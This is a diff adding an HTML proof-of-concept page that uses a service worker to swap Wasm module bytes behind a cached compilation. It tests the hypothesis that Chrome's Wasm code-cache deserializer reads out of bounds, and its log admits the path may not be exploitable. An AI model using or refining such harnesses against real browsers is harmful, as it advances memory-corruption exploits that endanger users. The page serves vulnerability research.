@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Wasm Cache OOB PoC</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+#log { white-space: pre; font-size: 13px; }
+button { margin: 4px; padding: 8px 16px; background: #222; color: #0f0;
+         border: 1px solid #0f0; cursor: pointer; font-family: monospace; }
+</style>
+</head>
+<body>
+<h2>Wasm NativeModuleDeserializer ReadCode OOB — Browser PoC</h2>
+<p>
+  <b>Theory:</b> Chrome may reuse a cached compiled blob (200-fn) with mismatched
+  wire bytes (1-fn) via AsyncStreamingProcessor::Deserialize (no hash guard).
+</p>
+<button onclick="runStep1()">Step 1: Compile &amp; cache 200-fn module</button>
+<button onclick="runStep2()">Step 2: Switch to 1-fn, force re-fetch (expect crash)</button>
+<button onclick="clearAll()">Clear cache &amp; SW</button>
+<pre id="log">[ready — open DevTools console for more detail]
+</pre>
+
+<script>
+const log = s => {
+  document.getElementById('log').textContent += s + '\n';
+  console.log(s);
+};
+
+let swReg = null;
+
+async function init() {
+  if (!('serviceWorker' in navigator)) { log('[!] Service Worker not supported'); return; }
+  swReg = await navigator.serviceWorker.register('./sw.js', { scope: './' });
+  await navigator.serviceWorker.ready;
+  log('[*] Service Worker registered');
+}
+
+async function setSWMode(mode) {
+  const sw = swReg?.active || navigator.serviceWorker.controller;
+  if (!sw) { log('[!] No active SW'); return; }
+  sw.postMessage({ mode });
+  log(`[*] SW mode → ${mode}`);
+}
+
+async function runStep1() {
+  log('\n=== Step 1: Compile 200-fn module via streaming ===');
+  await setSWMode('200fn');
+  // Small delay to let SW process the message
+  await new Promise(r => setTimeout(r, 100));
+  try {
+    // cache: 'reload' forces network fetch, allowing SW to intercept
+    const resp = fetch('./module.wasm', { cache: 'reload' });
+    const mod = await WebAssembly.compileStreaming(resp);
+    log(`[+] Compiled 200-fn module: ${WebAssembly.Module.exports(mod).length} exports`);
+    log('[*] Chrome may have cached the compiled blob for ./module.wasm');
+    log('[*] Now click Step 2 to serve 1-fn wire bytes at same URL');
+  } catch(e) {
+    log(`[!] Error: ${e}`);
+  }
+}
+
+async function runStep2() {
+  log('\n=== Step 2: Re-fetch with 1-fn wire bytes (cached blob = 200-fn) ===');
+  await setSWMode('1fn');
+  await new Promise(r => setTimeout(r, 100));
+  try {
+    log('[*] Fetching ./module.wasm — SW will return 1-fn wire bytes');
+    log('[*] If Chrome reuses cached 200-fn blob → DeserializeNativeModule OOB');
+    // cache: 'no-cache' revalidates, cache: 'reload' bypasses — try both
+    const resp = fetch('./module.wasm', { cache: 'no-cache' });
+    const mod = await WebAssembly.compileStreaming(resp);
+    log(`[*] Compiled without crash — exports: ${WebAssembly.Module.exports(mod).length}`);
+    log('[*] Chrome did NOT reuse cached blob (wire bytes hash mismatch = cache miss)');
+    log('[*] This path is NOT exploitable from pure JS in the browser');
+  } catch(e) {
+    log(`[CRASH/ERROR] ${e}`);
+    log('[!] If Chrome crashed → OOB confirmed in browser process!');
+  }
+}
+
+async function clearAll() {
+  const keys = await caches.keys();
+  for (const k of keys) await caches.delete(k);
+  if (swReg) await swReg.unregister();
+  log('[*] Cleared all caches and unregistered SW');
+}
+
+init();
+</script>
+</body>
+</html>
